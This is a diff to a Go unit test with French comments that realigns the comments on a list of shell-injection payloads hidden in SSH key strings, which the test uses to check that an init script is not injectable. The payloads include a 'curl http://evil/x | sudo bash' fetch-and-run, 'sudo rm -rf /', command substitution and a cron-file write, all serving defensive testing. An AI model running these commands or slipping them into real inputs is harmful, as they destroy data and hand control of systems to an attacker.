@@ -16,12 +16,12 @@ import (
 //  2. le script embarque bien le base64 de la clé, redécodable à l'identique.
 func TestCmdInit_NoShellInjection(t *testing.T) {
 	payloads := []string{
-		`ssh-ed25519 AAAA... user@host`,                              // clé légitime
-		`ssh-ed25519 AAAA... "; curl http://evil/x | sudo bash; "`,    // injection via commentaire
-		"ssh-rsa AAAA $(reboot)",                                      // substitution de commande
-		"ssh-rsa AAAA `id`",                                           // backticks
-		"ssh-rsa AAAA\n sudo rm -rf /",                                // saut de ligne → nouvelle commande
-		"' ; echo pwned > /etc/cron.d/x ; '",                          // fermeture d'apostrophe
+		`ssh-ed25519 AAAA... user@host`,                            // clé légitime
+		`ssh-ed25519 AAAA... "; curl http://evil/x | sudo bash; "`, // injection via commentaire
+		"ssh-rsa AAAA $(reboot)",                                   // substitution de commande
+		"ssh-rsa AAAA `id`",                                        // backticks
+		"ssh-rsa AAAA\n sudo rm -rf /",                             // saut de ligne → nouvelle commande
+		"' ; echo pwned > /etc/cron.d/x ; '",                       // fermeture d'apostrophe
 	}
 
 	for _, p := range payloads {
